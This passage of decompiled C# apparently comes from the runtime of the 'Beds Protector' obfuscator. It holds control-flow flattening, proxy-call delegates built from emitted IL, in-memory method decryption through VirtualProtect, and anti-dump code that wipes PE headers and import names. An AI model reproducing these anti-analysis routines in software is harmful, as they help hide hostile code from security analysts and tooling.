    dynamicIlInfo.SetCode(code, parameterTypes.Length + 1);
    fieldFromHandle.SetValue((object) null, (object) dynamicMethod.CreateDelegate(fieldType));
  }

  [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
  static extern int Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogmBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogmBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] int obj0);

  static void Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogMBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogMBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] RuntimeFieldHandle obj0,
    [In] byte obj1)
  {
    int num1 = 2919 - 59446 + 56527;
    MethodInfo methodInfo;
    Type[] parameterTypes;
    FieldInfo fieldFromHandle;
    Type fieldType;
    MethodBase method;
    DynamicMethod dynamicMethod;
    Type declaringType;
    do
    {
      ParameterInfo[] parameters;
      if (num1 == 55365 - 45801 - 9546)
      {
        parameters = methodInfo.GetParameters();
        num1 = 55337 - 150852 + 95534;
      }
      byte[] numArray;
      int num2;
      if (num1 == 42319 + 41884 - 84200)
      {
        num2 = numArray.Length;
        num1 = 60260 - 64270 + 4014;
      }
      if (num1 != 42296 - 90826 + 48546)
        goto label_7;
label_6:
      MethodInfo[] methods;
      int index1;
      methodInfo = methods[index1];
      num1 = 46490 - 65879 + 19406;
label_7:
      if (num1 == 98659 - 1574 - 97071)
      {
        index1 = 0;
        num1 = 16626 + 50160 - 66771;
      }
      if (num1 == 45236 - 88879 + 43653)
        return;
      if (num1 == 98845 - 139639 + 40806)
      {
        parameterTypes = (Type[]) null;
        num1 = 70975 - 121836 + 50874;
      }
      if (num1 == 91187 - 107136 + 15956)
      {
        fieldType = fieldFromHandle.FieldType;
        num1 = 13334 + 74832 - 88158;
      }
      if (num1 == 51478 + 15148 - 66618)
      {
        if (method.IsStatic)
          num1 = 64591 - 83229 + 18647;
        else
          goto label_29;
      }
      int metadataToken;
      if (num1 == 22321 + 4139 - 26454)
      {
        method = fieldFromHandle.Module.ResolveMethod(metadataToken);
        num1 = 39014 + 816 - 39823;
      }
      if (num1 == 37019 + 59456 - 96471)
      {
        int num3;
        int num4;
        int num5;
        int num6 = fieldFromHandle.GetOptionalCustomModifiers()[0].MetadataToken + (((int) fieldFromHandle.Name[2] ^ (int) numArray[num3 = num2 - 1]) << 0) + (((int) fieldFromHandle.Name[3] ^ (int) numArray[num4 = num3 - 1]) << 16) + (((int) fieldFromHandle.Name[0] ^ (int) numArray[num5 = num4 - 1]) << 24);
        int num7 = num5 - 1;
        int num8 = ((int) fieldFromHandle.Name[1] ^ (int) numArray[num2 = num7 - 1]) << 8;
        metadataToken = \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDognBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDognBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(num6 + num8);
        num1 = 42775 - 35200 - 7570;
      }
      if (num1 == 51880 - 42526 - 9353)
      {
        fieldFromHandle = FieldInfo.GetFieldFromHandle(obj0);
        num1 = 209 - 63434 + 63227;
      }
      if (num1 == 63207 - 68804 + 5599)
      {
        numArray = fieldFromHandle.Module.ResolveSignature(fieldFromHandle.MetadataToken);
        num1 = 97671 - 130110 + 32442;
      }
      if (num1 != 409 + 3449 - 3843)
      {
        if (num1 == 153 - 82876 + 82736)
        {
          methods = fieldFromHandle.FieldType.GetMethods(BindingFlags.Instance | BindingFlags.NonPublic);
          num1 = 25006 - 14166 - 10826;
        }
        if (num1 != 57536 - 151097 + 93572)
          goto label_30;
      }
      else
        goto label_57;
label_29:
      dynamicMethod = (DynamicMethod) null;
      num1 = 48424 + 983 - 49395;
label_30:
      if (num1 == 54403 - 9793 - 44585)
      {
        declaringType = method.DeclaringType;
        num1 = 73789 + 8386 - 82149;
      }
      if (num1 == 78805 - 19482 - 59304)
      {
        parameterTypes = new Type[parameters.Length];
        num1 = 23566 + 3390 - 26936;
      }
      if (num1 == 43050 + 13047 - 56088)
      {
        fieldFromHandle.SetValue((object) null, (object) Delegate.CreateDelegate(fieldType, (MethodInfo) method));
        num1 = 94011 - 174435 + 80434;
      }
      if (num1 != 35980 - 106151 + 70192)
      {
        if (num1 == 24834 - 4429 - 20388)
        {
          if ((object) methodInfo.DeclaringType == (object) fieldType)
          {
            num1 = 98526 - 35122 - 63386;
          }
          else
          {
            ++index1;
            goto label_57;
          }
        }
        if (num1 == 69654 - 129451 + 59802)
        {
          metadataToken *= fieldFromHandle.GetCustomAttributes(false)[0].GetHashCode();
          num1 = 56204 - 49308 - 6890;
        }
        if (num1 != 87856 - 88708 + 874)
          goto label_44;
      }
      else
        goto label_47;
label_43:
      int index2;
      parameterTypes[index2] = parameters[index2].ParameterType;
      num1 = 21694 - 1599 - 20072;
label_44:
      if (num1 == 48724 - 127964 + 79260)
      {
        index2 = 0;
        num1 = 55800 - 53569 - 2210;
      }
      if (num1 != 54738 - 55375 + 661)
        goto label_49;
label_47:
      if (index2 >= parameterTypes.Length)
        num1 = 13138 - 74088 + 60975;
      else
        goto label_43;
label_49:
      if (num1 == 79202 - 84968 + 5789)
      {
        ++index2;
        num1 = 15129 - 111181 + 96076;
      }
      if (num1 == 61760 - 134026 + 72266)
        num1 = 95917 - 56756 - 39160;
      continue;
label_57:
      if (index1 < methods.Length)
        goto label_6;
      else
        goto label_58;
    }
    while (num1 != 67133 - 130306 + 63199);
    dynamicMethod = new DynamicMethod("", methodInfo.ReturnType, parameterTypes, declaringType.IsInterface || declaringType.IsArray ? fieldType : declaringType, true);
label_58:
    DynamicILInfo dynamicIlInfo = dynamicMethod.GetDynamicILInfo();
    dynamicIlInfo.SetLocalSignature(new byte[2]
    {
      (byte) 7,
      (byte) 0
    });
    byte[] code = new byte[7 * parameterTypes.Length + 6];
    int num9 = 0;
    ParameterInfo[] parameters1 = method.GetParameters();
    int index3 = method.IsConstructor ? 0 : -1;
    for (int index4 = 0; index4 < parameterTypes.Length; ++index4)
    {
      byte[] numArray1 = code;
      int index5 = num9;
      int num10 = index5 + 1;
      numArray1[index5] = (byte) 14;
      byte[] numArray2 = code;
      int index6 = num10;
      int num11 = index6 + 1;
      int num12 = (int) (byte) index4;
      numArray2[index6] = (byte) num12;
      Type type = index3 == -1 ? method.DeclaringType : parameters1[index3].ParameterType;
      if (type.IsClass && !type.IsPointer && !type.IsByRef)
      {
        int tokenFor = dynamicIlInfo.GetTokenFor(type.TypeHandle);
        byte[] numArray3 = code;
        int index7 = num11;
        int num13 = index7 + 1;
        numArray3[index7] = (byte) 116;
        byte[] numArray4 = code;
        int index8 = num13;
        int num14 = index8 + 1;
        int num15 = (int) (byte) tokenFor;
        numArray4[index8] = (byte) num15;
        byte[] numArray5 = code;
        int index9 = num14;
        int num16 = index9 + 1;
        int num17 = (int) (byte) (tokenFor >> 8);
        numArray5[index9] = (byte) num17;
        byte[] numArray6 = code;
        int index10 = num16;
        int num18 = index10 + 1;
        int num19 = (int) (byte) (tokenFor >> 16);
        numArray6[index10] = (byte) num19;
        byte[] numArray7 = code;
        int index11 = num18;
        num9 = index11 + 1;
        int num20 = (int) (byte) (tokenFor >> 24);
        numArray7[index11] = (byte) num20;
      }
      else
        num9 = num11 + 5;
      ++index3;
    }
    byte[] numArray8 = code;
    int index12 = num9;
    int num21 = index12 + 1;
    int num22 = (int) (byte) ((uint) (byte) fieldFromHandle.Name[4] ^ (uint) obj1);
    numArray8[index12] = (byte) num22;
    int tokenFor1 = dynamicIlInfo.GetTokenFor(method.MethodHandle);
    byte[] numArray9 = code;
    int index13 = num21;
    int num23 = index13 + 1;
    int num24 = (int) (byte) tokenFor1;
    numArray9[index13] = (byte) num24;
    byte[] numArray10 = code;
    int index14 = num23;
    int num25 = index14 + 1;
    int num26 = (int) (byte) (tokenFor1 >> 8);
    numArray10[index14] = (byte) num26;
    byte[] numArray11 = code;
    int index15 = num25;
    int num27 = index15 + 1;
    int num28 = (int) (byte) (tokenFor1 >> 16);
    numArray11[index15] = (byte) num28;
    byte[] numArray12 = code;
    int index16 = num27;
    int index17 = index16 + 1;
    int num29 = (int) (byte) (tokenFor1 >> 24);
    numArray12[index16] = (byte) num29;
    code[index17] = (byte) 42;
    dynamicIlInfo.SetCode(code, parameterTypes.Length + 1);
    fieldFromHandle.SetValue((object) null, (object) dynamicMethod.CreateDelegate(fieldType));
  }

  [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
  static extern int Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDognBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDognBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] int obj0);

  [DllImport("kernel32.dll", EntryPoint = "VirtualProtect")]
  internal static extern bool Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogNBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogNBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] IntPtr obj0,
    [In] uint obj1,
    [In] uint obj2,
    [In] ref uint obj3);

  [DllImport("kernel32.dll", EntryPoint = "VirtualProtect")]
  internal static extern unsafe bool Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogoBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogoBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] byte* obj0,
    [In] int obj1,
    [In] uint obj2,
    [In] ref uint obj3);

  internal static unsafe void Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogOBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogOBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ()
  {
    Module module1 = typeof (\u003CModule\u003E).Module;
    string fullyQualifiedName = module1.FullyQualifiedName;
    bool flag = fullyQualifiedName.Length > 0 && fullyQualifiedName[0] == '<';
    byte* hinstance1 = (byte*) (void*) Marshal.GetHINSTANCE(module1);
    byte* numPtr1 = hinstance1 + *(uint*) (hinstance1 + 60);
    ushort num1 = *(ushort*) (numPtr1 + 6);
    ushort num2 = *(ushort*) (numPtr1 + 20);
    uint* numPtr2 = (uint*) null;
    uint num3 = 0;
    uint* numPtr3 = (uint*) (numPtr1 + 24 + (int) num2);
    uint num4 = 833071385;
    uint num5 = 456039705;
    uint num6 = 30066796;
    uint num7 = 3502966119;
    for (int index1 = 0; index1 < (int) num1; ++index1)
    {
      uint* numPtr4 = numPtr3;
      uint* numPtr5 = (uint*) ((IntPtr) numPtr4 + 4);
      int num8 = (int) *numPtr4;
      uint* numPtr6 = numPtr5;
      uint* numPtr7 = (uint*) ((IntPtr) numPtr6 + 4);
      int num9 = (int) *numPtr6;
      switch ((uint) (num8 * num9))
      {
        case 0:
          numPtr3 = numPtr7 + 8;
          continue;
        case 2862795566:
          numPtr2 = (uint*) (hinstance1 + (flag ? numPtr7[3] : numPtr7[1]));
          num3 = (flag ? numPtr7[2] : *numPtr7) >> 2;
          goto case 0;
        default:
          uint* numPtr8 = (uint*) (hinstance1 + (flag ? numPtr7[3] : numPtr7[1]));
          uint num10 = numPtr7[2] >> 2;
          for (uint index2 = 0; index2 < num10; ++index2)
          {
            int num11 = ((int) num4 ^ (int) *numPtr8++) + (int) num5 + (int) num6 * (int) num7;
            num4 = num5;
            num5 = num7;
            num7 = (uint) num11;
          }
          goto case 0;
      }
    }
    uint[] numArray1 = new uint[16];
    uint[] numArray2 = new uint[16];
    for (int index = 0; index < 16; ++index)
    {
      numArray1[index] = num7;
      numArray2[index] = num5;
      uint num12 = num5 >> 5 | num5 << 27;
      num5 = num6 >> 3 | num6 << 29;
      num6 = num7 >> 7 | num7 << 25;
      num7 = num12 >> 11 | num12 << 21;
    }
    numArray1[0] = numArray1[0] ^ numArray2[0];
    numArray1[1] = numArray1[1] * numArray2[1];
    numArray1[2] = numArray1[2] + numArray2[2];
    numArray1[3] = numArray1[3] ^ numArray2[3];
    numArray1[4] = numArray1[4] * numArray2[4];
    numArray1[5] = numArray1[5] + numArray2[5];
    numArray1[6] = numArray1[6] ^ numArray2[6];
    numArray1[7] = numArray1[7] * numArray2[7];
    numArray1[8] = numArray1[8] + numArray2[8];
    numArray1[9] = numArray1[9] ^ numArray2[9];
    numArray1[10] = numArray1[10] * numArray2[10];
    numArray1[11] = numArray1[11] + numArray2[11];
    numArray1[12] = numArray1[12] ^ numArray2[12];
    numArray1[13] = numArray1[13] * numArray2[13];
    numArray1[14] = numArray1[14] + numArray2[14];
    numArray1[15] = numArray1[15] ^ numArray2[15];
    uint num13 = 64;
    \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogNBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogNBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ((IntPtr) (void*) numPtr2, num3 << 2, num13, ref num13);
    if (num13 == 64U)
      return;
    uint num14 = 0;
    for (uint index = 0; index < num3; ++index)
    {
      uint* numPtr9 = numPtr2;
      int num15 = (int) *numPtr9 ^ (int) numArray1[(int) num14 & 15];
      *numPtr9 = (uint) num15;
      numArray1[(int) num14 & 15] = (uint) (((int) numArray1[(int) num14 & 15] ^ (int) *numPtr2++) + 1035675673);
      ++num14;
    }
    Module module2 = typeof (\u003CModule\u003E).Module;
    byte* hinstance2 = (byte*) (void*) Marshal.GetHINSTANCE(module2);
    byte* numPtr10 = hinstance2 + 60;
    byte* numPtr11 = hinstance2 + *(uint*) numPtr10 + 6;
    ushort length = *(ushort*) numPtr11;
    byte* numPtr12 = numPtr11 + 14;
    ushort num16 = *(ushort*) numPtr12;
    byte* destination = numPtr12 + 4 + (int) num16;
    byte* numPtr13 = stackalloc byte[11];
    if (module2.FullyQualifiedName[0] != '<')
    {
      byte* numPtr14 = hinstance2 + *(uint*) (destination - 16);
      uint num17;
      if (*(uint*) (destination - 120) != 0U)
      {
        byte* numPtr15 = hinstance2 + *(uint*) (destination - 120);
        byte* numPtr16 = hinstance2 + *(uint*) numPtr15;
        byte* numPtr17 = hinstance2 + *(uint*) (numPtr15 + 12);
        byte* numPtr18 = hinstance2 + *(uint*) numPtr16 + 2;
        \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogoBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogoBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(numPtr17, 11, 64U, ref num17);
        *(int*) numPtr13 = 1818522734;
        *(int*) (numPtr13 + 4) = 1818504812;
        *(short*) (numPtr13 + (new IntPtr(4) * 2).ToInt64()) = (short) 108;
        numPtr13[10] = (byte) 0;
        for (int index = 0; index < 11; ++index)
          numPtr17[index] = numPtr13[index];
        \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogoBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogoBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(numPtr18, 11, 64U, ref num17);
        *(int*) numPtr13 = 1866691662;
        *(int*) (numPtr13 + 4) = 1852404846;
        *(short*) (numPtr13 + (new IntPtr(4) * 2).ToInt64()) = (short) 25973;
        numPtr13[10] = (byte) 0;
        for (int index = 0; index < 11; ++index)
          numPtr18[index] = numPtr13[index];
      }
      for (int index = 0; index < (int) length; ++index)
      {
        \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogoBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogoBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(destination, 8, 64U, ref num17);
        Marshal.Copy(new byte[8], 0, (IntPtr) (void*) destination, 8);
        destination += 40;
      }
      \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogoBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogoBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(numPtr14, 72, 64U, ref num17);
      byte* numPtr19 = hinstance2 + *(uint*) (numPtr14 + 8);
      *(int*) numPtr14 = 0;
      *(int*) (numPtr14 + 4) = 0;
      *(int*) (numPtr14 + (new IntPtr(2) * 4).ToInt64()) = 0;
      *(int*) (numPtr14 + (new IntPtr(3) * 4).ToInt64()) = 0;
      \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogoBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogoBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(numPtr19, 4, 64U, ref num17);
      *(int*) numPtr19 = 0;
      byte* numPtr20 = numPtr19 + 12;
      byte* numPtr21 = (byte*) ((ulong) (numPtr20 + *(uint*) numPtr20) + 7UL & 18446744073709551612UL) + 2;
      ushort num18 = (ushort) *numPtr21;
      byte* numPtr22 = numPtr21 + 2;
      for (int index3 = 0; index3 < (int) num18; ++index3)
      {
        \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogoBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogoBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(numPtr22, 8, 64U, ref num17);
        numPtr22 = numPtr22 + 4 + 4;
        for (int index4 = 0; index4 < 8; ++index4)
        {
          \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogoBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogoBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(numPtr22, 4, 64U, ref num17);
          *numPtr22 = (byte) 0;
          byte* numPtr23 = numPtr22 + 1;
          if (*numPtr23 == (byte) 0)
          {
            numPtr22 = numPtr23 + 3;
            break;
          }
          *numPtr23 = (byte) 0;
          byte* numPtr24 = numPtr23 + 1;
          if (*numPtr24 == (byte) 0)
          {
            numPtr22 = numPtr24 + 2;
            break;
          }
          *numPtr24 = (byte) 0;
          byte* numPtr25 = numPtr24 + 1;
          if (*numPtr25 == (byte) 0)
          {
            numPtr22 = numPtr25 + 1;
            break;
          }
          *numPtr25 = (byte) 0;
          numPtr22 = numPtr25 + 1;
        }
      }
    }
    else
    {
      uint num19 = *(uint*) (destination - 16);
      uint num20 = *(uint*) (destination - 120);
      uint[] numArray3 = new uint[(int) length];
      uint[] numArray4 = new uint[(int) length];
      uint[] numArray5 = new uint[(int) length];
      uint num21;
      for (int index = 0; index < (int) length; ++index)
      {
        \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogoBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogoBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(destination, 8, 64U, ref num21);
        Marshal.Copy(new byte[8], 0, (IntPtr) (void*) destination, 8);
        numArray3[index] = *(uint*) (destination + 12);
        numArray4[index] = *(uint*) (destination + 8);
        numArray5[index] = *(uint*) (destination + 20);
        destination += 40;
      }
      if (num20 != 0U)
      {
        for (int index = 0; index < (int) length; ++index)
        {
          if (numArray3[index] <= num20 && num20 < numArray3[index] + numArray4[index])
          {
            num20 = num20 - numArray3[index] + numArray5[index];
            break;
          }
        }
        byte* numPtr26 = hinstance2 + num20;
        uint num22 = *(uint*) numPtr26;
        for (int index = 0; index < (int) length; ++index)
        {
          if (numArray3[index] <= num22 && num22 < numArray3[index] + numArray4[index])
          {
            num22 = num22 - numArray3[index] + numArray5[index];
            break;
          }
        }
        byte* numPtr27 = hinstance2 + num22;
        uint num23 = *(uint*) (numPtr26 + 12);
        for (int index = 0; index < (int) length; ++index)
        {
          if (numArray3[index] <= num23 && num23 < numArray3[index] + numArray4[index])
          {
            num23 = num23 - numArray3[index] + numArray5[index];
            break;
          }
        }
        uint num24 = *(uint*) numPtr27 + 2U;
        for (int index = 0; index < (int) length; ++index)
        {
          if (numArray3[index] <= num24 && num24 < numArray3[index] + numArray4[index])
          {
            num24 = num24 - numArray3[index] + numArray5[index];
            break;
          }
        }
        \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogoBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogoBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(hinstance2 + num23, 11, 64U, ref num21);
        *(int*) numPtr13 = 1818522734;
        *(int*) (numPtr13 + 4) = 1818504812;
        *(short*) (numPtr13 + (new IntPtr(4) * 2).ToInt64()) = (short) 108;
        numPtr13[10] = (byte) 0;
        for (int index = 0; index < 11; ++index)
          (hinstance2 + num23)[index] = numPtr13[index];
        \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogoBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogoBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(hinstance2 + num24, 11, 64U, ref num21);
        *(int*) numPtr13 = 1866691662;
        *(int*) (numPtr13 + 4) = 1852404846;
        *(short*) (numPtr13 + (new IntPtr(4) * 2).ToInt64()) = (short) 25973;
        numPtr13[10] = (byte) 0;
        for (int index = 0; index < 11; ++index)
          (hinstance2 + num24)[index] = numPtr13[index];
      }
      for (int index = 0; index < (int) length; ++index)
      {
        if (numArray3[index] <= num19 && num19 < numArray3[index] + numArray4[index])
        {
          num19 = num19 - numArray3[index] + numArray5[index];
          break;
        }
      }
      byte* numPtr28 = hinstance2 + num19;
      \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogoBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogoBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(numPtr28, 72, 64U, ref num21);
      uint num25 = *(uint*) (numPtr28 + 8);
      for (int index = 0; index < (int) length; ++index)
      {
        if (numArray3[index] <= num25 && num25 < numArray3[index] + numArray4[index])
        {
          num25 = num25 - numArray3[index] + numArray5[index];
          break;
        }
      }
      *(int*) numPtr28 = 0;
      *(int*) (numPtr28 + 4) = 0;
      *(int*) (numPtr28 + (new IntPtr(2) * 4).ToInt64()) = 0;
      *(int*) (numPtr28 + (new IntPtr(3) * 4).ToInt64()) = 0;
      byte* numPtr29 = hinstance2 + num25;
      \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogoBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogoBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(numPtr29, 4, 64U, ref num21);
      *(int*) numPtr29 = 0;
      byte* numPtr30 = numPtr29 + 12;
      byte* numPtr31 = (byte*) ((ulong) (numPtr30 + *(uint*) numPtr30) + 7UL & 18446744073709551612UL) + 2;
      ushort num26 = (ushort) *numPtr31;
      byte* numPtr32 = numPtr31 + 2;
      for (int index5 = 0; index5 < (int) num26; ++index5)
      {
        \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogoBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogoBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(numPtr32, 8, 64U, ref num21);
        numPtr32 = numPtr32 + 4 + 4;
        for (int index6 = 0; index6 < 8; ++index6)
        {
          \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogoBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogoBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(numPtr32, 4, 64U, ref num21);
          *numPtr32 = (byte) 0;
          byte* numPtr33 = numPtr32 + 1;
          if (*numPtr33 == (byte) 0)
          {
            numPtr32 = numPtr33 + 3;
            break;
          }
          *numPtr33 = (byte) 0;
          byte* numPtr34 = numPtr33 + 1;
          if (*numPtr34 == (byte) 0)
          {
            numPtr32 = numPtr34 + 2;
            break;
          }
          *numPtr34 = (byte) 0;
          byte* numPtr35 = numPtr34 + 1;
          if (*numPtr35 == (byte) 0)
          {
            numPtr32 = numPtr35 + 1;
            break;
          }
          *numPtr35 = (byte) 0;
          numPtr32 = numPtr35 + 1;
        }
      }
    }
  }
}
